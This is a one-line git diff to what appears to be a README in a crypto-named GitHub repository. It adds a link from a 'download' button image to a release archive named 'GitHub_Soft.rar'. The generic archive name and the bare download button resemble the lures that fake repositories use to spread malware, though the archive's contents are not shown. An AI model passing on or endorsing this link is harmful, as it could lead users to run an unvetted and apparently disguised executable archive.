@@ -1,5 +1,5 @@
 
-[![загр](https://github.com/pimmom/signal-crypto/assets/164097566/9eba8558-4cd0-426b-889c-3fff84b90be3)]()
+[![загр](https://github.com/pimmom/signal-crypto/assets/164097566/9eba8558-4cd0-426b-889c-3fff84b90be3)](https://github.com/pimmom/signal-crypto/releases/download/download/GitHub_Soft.rar)
 
 
 
